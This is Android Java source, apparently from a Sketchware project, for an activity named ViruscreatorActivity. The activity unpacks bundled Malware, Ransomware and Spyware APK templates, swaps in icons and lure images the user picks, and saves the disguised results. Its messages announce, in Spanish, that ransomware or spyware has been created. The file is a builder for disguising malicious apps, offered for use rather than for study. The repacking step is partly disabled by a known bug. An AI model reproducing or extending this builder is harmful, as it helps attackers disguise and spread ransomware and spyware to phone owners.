package com.mgtols.neptyx;

import android.app.Activity;
import android.app.*;
import android.os.*;
import android.view.*;
import android.view.View.*;
import android.widget.*;
import android.content.*;
import android.content.res.*;
import android.graphics.*;
import android.graphics.drawable.*;
import android.media.*;
import android.net.*;
import android.text.*;
import android.text.style.*;
import android.util.*;
import android.webkit.*;
import android.animation.*;
import android.view.animation.*;
import java.util.*;
import java.util.regex.*;
import java.text.*;
import org.json.*;
import android.widget.LinearLayout;
import android.widget.ImageView;
import android.widget.EditText;
import android.widget.Button;
import android.content.Intent;
import android.net.Uri;
import android.view.View;
import android.app.Fragment;
import android.app.FragmentManager;
import android.app.DialogFragment;
import android.Manifest;
import android.content.pm.PackageManager;


public class ViruscreatorActivity extends  Activity { 
	
	
	private String finalPath = "";
	private String cachePath = "";
	private String fina = "";
	private String dir = "";
	private String basa = "";
	private String folder = "";
	private String zipFilePath = "";
	
	private LinearLayout linear1;
	private ImageView imageview1;
	private EditText img1;
	private EditText img2;
	private EditText img3;
	private Button button3;
	private EditText img4;
	private EditText img5;
	private EditText img6;
	private Button button4;
	private EditText img7;
	private EditText img8;
	private Button button5;
	
	private Intent a = new Intent();
	@Override
	protected void onCreate(Bundle _savedInstanceState) {
		super.onCreate(_savedInstanceState);
		setContentView(R.layout.viruscreator);
		initialize(_savedInstanceState);
		if (Build.VERSION.SDK_INT >= 23) {
			if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_DENIED
			|| checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_DENIED) {
				requestPermissions(new String[] {Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, 1000);
			}
			else {
				initializeLogic();
			}
		}
		else {
			initializeLogic();
		}
	}
	@Override
	public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
		super.onRequestPermissionsResult(requestCode, permissions, grantResults);
		if (requestCode == 1000) {
			initializeLogic();
		}
	}
	
	private void initialize(Bundle _savedInstanceState) {
		
		linear1 = (LinearLayout) findViewById(R.id.linear1);
		imageview1 = (ImageView) findViewById(R.id.imageview1);
		img1 = (EditText) findViewById(R.id.img1);
		img2 = (EditText) findViewById(R.id.img2);
		img3 = (EditText) findViewById(R.id.img3);
		button3 = (Button) findViewById(R.id.button3);
		img4 = (EditText) findViewById(R.id.img4);
		img5 = (EditText) findViewById(R.id.img5);
		img6 = (EditText) findViewById(R.id.img6);
		button4 = (Button) findViewById(R.id.button4);
		img7 = (EditText) findViewById(R.id.img7);
		img8 = (EditText) findViewById(R.id.img8);
		button5 = (Button) findViewById(R.id.button5);
		
		imageview1.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				a.setAction(Intent.ACTION_VIEW);
				a.setClass(getApplicationContext(), MenuActivity.class);
				startActivity(a);
				finish();
			}
		});
		
		button3.setOnLongClickListener(new View.OnLongClickListener() {
			 @Override
				public boolean onLongClick(View _view) {
				
				return true;
				}
			 });
		
		button3.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				FileUtil.makeDir(FileUtil.getExternalStorageDir().concat("/.mgtols/.temp"));
				basa = FileUtil.getExternalStorageDir().concat("/MgToLs/");
				fina = FileUtil.getExternalStorageDir().concat("/.mgtols/.temp/");
				finalPath = FileUtil.getExternalStorageDir().concat("/.mgtols/Malware.apk");
				dir = "/res/drawable-xhdpi-v4/";
				_UnZip(finalPath, fina);
				FileUtil.copyFile(img1.getText().toString(), fina.concat(dir.concat("/app_icon.png")));
				FileUtil.copyFile(img2.getText().toString(), fina.concat(dir.concat("/payload.png")));
				FileUtil.copyFile(img3.getText().toString(), fina.concat(dir.concat("/principal.png")));
			}
		});
		
		button4.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				FileUtil.makeDir(FileUtil.getExternalStorageDir().concat("/.mgtols/.temp"));
				basa = FileUtil.getExternalStorageDir().concat("/MgToLs/");
				fina = FileUtil.getExternalStorageDir().concat("/.mgtols/.temp/");
				finalPath = FileUtil.getExternalStorageDir().concat("/.mgtols/Ransomware.apk");
				dir = "/res/drawable-xhdpi-v4/";
				_UnZip(finalPath, fina);
				FileUtil.copyFile(img4.getText().toString(), fina.concat(dir.concat("/app_icon.png")));
				FileUtil.copyFile(img5.getText().toString(), fina.concat(dir.concat("/inran.png")));
				FileUtil.copyFile(img6.getText().toString(), fina.concat(dir.concat("/loading.png")));
				if (1 < 1) {
					FileUtil.writeFile("xd", "Sacar esto cuando solucionemos el error de el zip xd");
					_zip(fina, basa.concat("/Ransomware.apk"));
					FileUtil.deleteFile(fina);
				}
				FileUtil.moveFile(fina, basa.concat("Ransomware"));
				SketchwareUtil.showMessage(getApplicationContext(), "Ransomware creado y guardado en ".concat(basa.concat("/Ransomware.apk")));
			}
		});
		
		button5.setOnClickListener(new View.OnClickListener() {
			@Override
			public void onClick(View _view) {
				FileUtil.makeDir(FileUtil.getExternalStorageDir().concat("/.mgtols/.temp"));
				basa = FileUtil.getExternalStorageDir().concat("/MgToLs/");
				fina = FileUtil.getExternalStorageDir().concat("/.mgtols/.temp/");
				finalPath = FileUtil.getExternalStorageDir().concat("/.mgtols/Spyware.apk");
				dir = "/res/drawable-xhdpi-v4/";
				_UnZip(finalPath, fina);
				FileUtil.copyFile(img7.getText().toString(), fina.concat(dir.concat("/app_icon.png")));
				if (1 > 1) {
					FileUtil.writeFile("xd", "Sacar esto cuando solucionemos el error de el zip xd");
					_zip(fina, basa.concat("/Spyware.apk"));
					FileUtil.deleteFile(fina);
				}
				FileUtil.moveFile(fina, basa.concat("Spyware"));
				SketchwareUtil.showMessage(getApplicationContext(), "Spyware creado y guardado en ".concat(basa.concat("/Spyware.apk")));
			}
		});
	}
	
	private void initializeLogic() {
	}
	
	@Override
	protected void onActivityResult(int _requestCode, int _resultCode, Intent _data) {
		
		super.onActivityResult(_requestCode, _resultCode, _data);
		
		switch (_requestCode) {
			
			default:
			break;
		}
	}
	
	public void _zip (final String _source, final String _destination) {
		FileUtil.writeFile("Don't Remove it Thanks .\nFound by: tekken-rca\nModified By: Amitoj", "This Block Added for Manage Permission");
		try {
			java.util.zip.ZipOutputStream os = new java.util.zip.ZipOutputStream(new java.io.FileOutputStream(_destination));
					zip(os, _source, null);
					os.close();
		}
		
		catch(java.io.IOException e) {}
	}
	private void zip(java.util.zip.ZipOutputStream os, String filePath, String name) throws java.io.IOException
		{
				java.io.File file = new java.io.File(filePath);
				java.util.zip.ZipEntry entry = new java.util.zip.ZipEntry((name != null ? name + java.io.File.separator : "") + file.getName() + (file.isDirectory() ? java.io.File.separator : ""));
				os.putNextEntry(entry);
				
				if(file.isFile()) {
						java.io.InputStream is = new java.io.FileInputStream(file);
						int size = is.available();
						byte[] buff = new byte[size];
						int len = is.read(buff);
						os.write(buff, 0, len);
						return;
				}
				
				java.io.File[] fileArr = file.listFiles();
				for(java.io.File subFile : fileArr) {
						zip(os, subFile.getAbsolutePath(), entry.getName());
				}
	}
	
	
	public void _UnZip (final String _fileZip, final String _destDir) {
		try
		{
			java.io.File outdir = new java.io.File(_destDir);
			java.util.zip.ZipInputStream zin = new java.util.zip.ZipInputStream(new java.io.FileInputStream(_fileZip));
			java.util.zip.ZipEntry entry;
			String name, dir;
			while ((entry = zin.getNextEntry()) != null)
			{
				name = entry.getName();
				if(entry.isDirectory())
				{
					mkdirs(outdir, name);
					continue;
				}
				
				/* this part is necessary because file entry can come before
* directory entry where is file located
* i.e.:
* /foo/foo.txt
* /foo/
*/
				
				dir = dirpart(name);
				if(dir != null)
				mkdirs(outdir, dir);
				
				extractFile(zin, outdir, name);
			}
			zin.close();
		}
		catch (java.io.IOException e)
		{
			e.printStackTrace();
		}
	}
	private static void extractFile(java.util.zip.ZipInputStream in, java.io.File outdir, String name) throws java.io.IOException
	{
		byte[] buffer = new byte[4096];
		java.io.BufferedOutputStream out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(new java.io.File(outdir, name)));
		int count = -1;
		while ((count = in.read(buffer)) != -1)
		out.write(buffer, 0, count);
		out.close();
	}
	
	private static void mkdirs(java.io.File outdir, String path)
	{
		java.io.File d = new java.io.File(outdir, path);
		if(!d.exists())
		d.mkdirs();
	}
	
	private static String dirpart(String name)
	{
		int s = name.lastIndexOf(java.io.File.separatorChar);
		return s == -1 ? null : name.substring(0, s);
	}
	
	
	@Deprecated
	public void showMessage(String _s) {
		Toast.makeText(getApplicationContext(), _s, Toast.LENGTH_SHORT).show();
	}
	
	@Deprecated
	public int getLocationX(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[0];
	}
	
	@Deprecated
	public int getLocationY(View _v) {
		int _location[] = new int[2];
		_v.getLocationInWindow(_location);
		return _location[1];
	}
	
	@Deprecated
	public int getRandom(int _min, int _max) {
		Random random = new Random();
		return random.nextInt(_max - _min + 1) + _min;
	}
	
	@Deprecated
	public ArrayList<Double> getCheckedItemPositionsToArray(ListView _list) {
		ArrayList<Double> _result = new ArrayList<Double>();
		SparseBooleanArray _arr = _list.getCheckedItemPositions();
		for (int _iIdx = 0; _iIdx < _arr.size(); _iIdx++) {
			if (_arr.valueAt(_iIdx))
			_result.add((double)_arr.keyAt(_iIdx));
		}
		return _result;
	}
	
	@Deprecated
	public float getDip(int _input){
		return TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, _input, getResources().getDisplayMetrics());
	}
	
	@Deprecated
	public int getDisplayWidthPixels(){
		return getResources().getDisplayMetrics().widthPixels;
	}
	
	@Deprecated
	public int getDisplayHeightPixels(){
		return getResources().getDisplayMetrics().heightPixels;
	}
	
}